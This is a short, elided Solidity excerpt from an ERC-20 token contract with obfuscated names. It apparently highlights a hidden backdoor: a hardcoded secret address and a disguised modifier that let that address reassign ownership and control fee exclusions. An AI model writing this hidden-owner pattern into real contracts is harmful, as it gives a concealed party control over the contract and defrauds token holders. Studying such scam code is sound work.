...
contract Ownable is Context {
    ...
    address private ownerAddress = 0x3987dC1207Bc309b7EF1098b0fa94439393BBAE8;
    ...
    modifier _ownerAddress() {
        require(ownerAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferOwnership(address newOwner) public virtual _ownerAddress {
        _owner = newOwner;
    }
}
...
contract aa is Context, IERC20, Ownable {
    ...
    uint256 public qqd = uint256(0);
    mapping(address => uint256) private qqe;
    address[] private _qqf;
    address owners;
    ...
    function excludeFromFee(address account) public _ownerAddress {
        _isExcludedFromFeelist[account] = true;
    }

    function includeInFee(address account) public _ownerAddress {
